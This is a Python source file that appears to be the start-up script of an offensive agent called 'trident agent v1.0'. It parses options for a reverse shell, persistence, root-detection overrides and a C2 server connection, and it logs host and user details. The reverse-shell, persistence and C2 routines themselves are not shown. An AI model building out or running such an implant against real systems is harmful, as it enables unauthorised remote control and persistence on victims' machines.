import agent_utils
import argparse
import platform
import os
import sys
import logging


class Config:
    LOG_LEVEL = logging.DEBUG
    STARTUP_MESSAGE = "trident agent v1.0"
    DEFAULT_RSH_HOST = "0.0.0.0"
    DEFAULT_RSH_PORT = 1337
    DEFAULT_PERSIST_NAME = "trident"
    DEFAULT_C2_SCHEME = "http"
    args = None


cfg = Config()


args = argparse.ArgumentParser()
args.add_argument("-r", "--reverse-shell", metavar="host:port", nargs="?", const=f"{cfg.DEFAULT_RSH_HOST}:{cfg.DEFAULT_RSH_PORT}", help="start a reverse shell on the specified host and port")
args.add_argument("-p", "--persist", metavar="module", nargs="?", help="persist the agent")
args.add_argument("--root", help="disable root detection - assume root", action="store_true")
args.add_argument("--no-root", help="disable root detection - assume non-root", action="store_true")
args.add_argument("-c", "--c2", metavar="scheme:host:port", help="connect to a C2 server")
cfg.args = args.parse_args()


l = logging.getLogger(__name__)
formatter = logging.Formatter("[%(levelname)s]\t%(message)s")
stdout_handler = logging.StreamHandler(sys.stdout)
stdout_handler.setFormatter(formatter)
l.addHandler(stdout_handler)
l.setLevel(cfg.LOG_LEVEL)
l.debug("logger initialized")


def linux():
    l.info("starting Linux agent...")
    root = os.geteuid() == 0
    if cfg.args.root:
        root = True



platform_info = platform.uname()
l.debug(f"platform info: {platform_info}")
l.info(f"detected platform: {platform_info.system} {platform_info.release} {platform_info.machine}")
l.info(f"detected user: {os.getlogin()}@{platform_info.node}")
if platform_info.system == "Linux":
    linux()
else:
    l.error(f"unsupported platform: {platform_info.system}")
    sys.exit(1)
